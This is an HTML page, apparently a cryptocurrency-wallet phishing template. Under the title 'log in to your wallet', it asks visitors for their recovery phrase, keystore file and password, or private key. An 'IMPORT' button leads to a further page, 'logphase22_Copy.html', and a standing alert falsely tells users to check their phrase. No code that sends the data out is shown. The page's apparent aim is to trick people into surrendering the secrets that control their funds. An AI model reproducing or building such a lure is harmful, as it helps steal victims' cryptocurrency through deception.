<!DOCTYPE html>
<html>
    <head>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
        <link rel="stylesheet" href="css/aa.css">
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
        <title> log in to your wallet </title>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<body>


      <div class="card w-75" style="margin: auto; margin-top: 30px;">
        <div class="card-body">
          <h5 class="card-title">Import Wallet</h5>
          <ul class="nav nav-tabs" id="myTab" role="tablist">
            <li class="nav-item" role="presentation">
              <button class="nav-link active" id="home-tab" data-bs-toggle="tab" data-bs-target="#home" type="button" role="tab" aria-controls="Phrase" aria-selected="true">Phrase</button>
            </li>
            <li class="nav-item" role="presentation">
              <button class="nav-link" id="profile-tab" data-bs-toggle="tab" data-bs-target="#profile" type="button" role="tab" aria-controls="Keystore JSON" aria-selected="true">Keystore JSON</button>
            </li>
            <li class="nav-item" role="presentation">
              <button class="nav-link" id="contact-tab" data-bs-toggle="tab" data-bs-target="#contact" type="button" role="tab" aria-controls="Private Key" aria-selected="true">Private Key</button>
            </li>
          </ul>
          <div class="tab-content" id="myTabContent">
            <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
                <div class="mb-3">
                    <label for="exampleFormControlTextarea1" class="form-label"></label>
                    <textarea class="form-control" id="exampleFormControlTextarea1" placeholder="Phrase" rows="3"></textarea>
                    <br>
                    <p>Typically 12 (sometimes 24) words seperated by a single spaces.
                    </p>
                  </div>
            </div>
            <div class="tab-pane fade" id="profile" role="tabpanel" aria-labelledby="profile-tab">
                <div class="mb-3">
                    <label for="exampleFormControlTextarea1" class="form-label"></label>
                    <textarea class="form-control" id="exampleFormControlTextarea1" placeholder="Keystore JSON" rows="3"></textarea>
                    <br>
                    <input type="password" class="form-control" id="inputPassword2" placeholder="Password">
                    <br>
                    <p>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p>
                  </div>
            </div>
            <div class="tab-pane fade" id="contact" role="tabpanel" aria-labelledby="contact-tab">
                <br>
                <div class="col-auto">
                    <input type="password" class="form-control" id="inputPassword2" placeholder="Private Key">
                    <br>
                    <p>Typically 12 (sometimes 24) words seperated by a single spaces.</p>
                  </div>
            </div>
          </div>

            <div class="d-grid gap-2">
              <a href="logphase22_Copy.html">
               <button class="btn btn-primary" type="submit" value="submit">IMPORT</button></a>
          </div>

          <br>
          <br>

          <div class="alert alert-primary d-flex align-items-center"  role="alert">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-exclamation-triangle-fill flex-shrink-0 me-2" viewBox="0 0 16 16" role="img" aria-label="Warning:">
              <path d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767L8.982 1.566zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z"/>
            </svg>
            <div>
              Please check your Phrase or Keyword arrangement
              
            </div>

            <button type="button" class="btn-close" style="align-content: flex-end;" data-bs-dismiss="alert" aria-label="Close"></button>
          </div>



        </div>
      </div>
      


</body>
</html>
